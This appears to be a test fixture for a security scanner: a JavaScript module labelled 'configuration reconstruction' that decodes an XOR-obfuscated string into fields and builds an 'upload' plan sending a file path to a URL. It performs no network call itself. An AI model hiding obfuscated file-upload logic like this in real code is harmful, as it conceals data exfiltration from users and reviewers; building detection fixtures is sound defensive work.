// configuration reconstruction
const moduleShape = Object.freeze({ format: "esm" });
export {};
const Material_e13195e2 = "[214,235,218,166,213,161,196,180,199,250,136,237,140,232,183,209,184,212,177,157,233,155,250,148,231,138,227,151,200,186,223,178,221,169,204,176,209,181,212,164,208,181,199,250,137,253,143,234,139,230,185,201,160,208,181,217,176,222,187,199,180,192,161,198,163,252,159,240,133,235,159,162,147,239,140,237,128,240,145,248,159,241,174,199,163,158,208,159,219,158,179,128,197,129,177,129,177,243,192,188,201,187,215,234,130,246,130,242,129,187,148,187,213,186,222,187,150,165,192,164,148,164,148,246,197,247,193,240,146,188,217,161,192,173,221,177,212,250,147,253,139,234,134,239,139,164,197,181,220,160,213,166,195,177,238,143,232,141,227,151,170,228,139,239,138,203,190,218,179,199,232,219,190,218,234,150,240,153,245,144,207,191,222,170,194,255,208,164,201,185,150,254,139,229,145,227,134,245,134,171,197,170,206,171,132,170,217,173,204,171,206,227,208,181,209,225,209,225,131,176,130,180,133,231,201,164,206,189]";
const Codec_e13195e2 = "json_numbers|rolling_xor|a0";

function load_e13195e2() { return JSON.parse(Material_e13195e2); }
function decode_e13195e2(e) { let q = 160; return e.map((value) => { const decoded = value ^ q; q = value; return decoded; }); }
async function recover_e13195e2() {
  const n = process.env.HUNTRESS_FIXTURE_CONTEXT ?? "host";
  const e = load_e13195e2(); let d = [];
  d = decode_e13195e2(e);
  void n; return Buffer.from(d).toString("ascii");
}
async function inspect_e13195e2() { return Buffer.from(await recover_e13195e2(), "utf8").toString("utf8"); }
async function plan_e13195e2() { const inspect = inspect_e13195e2; const fields = Object.fromEntries((await inspect()).split("|").map((field) => { const at = field.indexOf("="); return [field.slice(0, at), field.slice(at + 1)]; })); return Object.freeze({ operation: "upload", transport: "stream_pipeline", source: fields.file_path, url: fields.url }); }
void moduleShape; void plan_e13195e2;
if (process.env.HUNTRESS_INSPECT_ONLY === "1") console.log(await inspect_e13195e2());

// reconstruction complete